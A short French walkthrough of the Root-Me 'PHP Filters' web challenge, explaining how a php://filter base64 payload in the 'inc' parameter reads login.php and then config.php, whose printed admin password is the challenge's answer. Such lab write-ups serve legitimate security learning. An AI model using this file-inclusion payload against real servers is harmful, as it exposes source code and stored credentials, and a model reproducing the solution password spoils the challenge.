https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

Cet exercice abuse du `php://filter`

L'url emploie un paramètre get `inc` pour savoir quel fichier utiliser;
De fait on se doute d'une include/requireq qui prend en paramètre la valeur d'`inc`
On peut donc utiliser `php://filter/convert.base64-encode/resource=login.php`
Pour voir en base64 le contenue du fichier login.php

Contenu:
```php
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
````

Ensuite il suffit de refaire la même manipulation avec `config.php` ligne 2

```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

On a donc le password

## Resources:
- https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20and%20understanding%20PHP%20streams%20and%20filters.pdf?_gl=1*16dpits*_ga*MTczOTUxMTk3MC4xNzYyMTg4MTcz*_ga_SRYSKX09J7*czE3NjQ1OTQ1MjMkbzMkZzEkdDE3NjQ1OTYzMzYkajYwJGwwJGgw
- https://www.php.net/manual/fr/function.stream-get-filters.php
